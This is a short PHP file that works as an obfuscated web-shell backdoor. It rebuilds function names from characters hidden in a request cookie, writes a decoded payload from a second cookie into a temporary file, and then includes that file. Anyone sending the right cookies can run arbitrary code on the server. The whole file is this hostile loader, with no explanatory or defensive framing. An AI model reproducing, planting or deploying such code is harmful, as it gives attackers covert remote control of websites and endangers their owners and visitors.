<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[18])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 6;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[18][$n];
        if (!$c[18][$n + 1]) {
            if (!$c[18][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 6 + 1;
    }
    $k = $p[21]() . $p[29];
    if (!$p[8]($k)) {
        $n = $p[28]($k, $p[0]);
        $p[9]($n, $p[12] . $p[25]($p[5]($c[3])));
    }
    include($k);
}